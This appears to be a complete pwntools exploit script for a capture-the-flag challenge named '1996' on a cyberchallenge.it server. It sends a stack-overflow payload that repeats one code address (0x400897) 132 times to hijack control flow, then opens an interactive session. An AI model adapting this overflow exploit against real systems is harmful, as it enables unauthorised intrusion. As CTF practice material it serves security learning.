from pwn import *

# FILENAME: str = '1996'
HOST: str = '1996.challs.cyberchallenge.it'
PORT: int = 9121

def main():
  # proc = process(f'./{FILENAME}')
  proc = connect(HOST, PORT)
  payload = b'\x97\x08\x40\x00\x00\x00\x00\x00'*132
  try:
    proc.sendlineafter(b'read? ', payload)
  except Exception as e:
    print(e)
  else:
    print(proc.clean())
  proc.interactive()
  proc.close()

if __name__ == "__main__":
  main()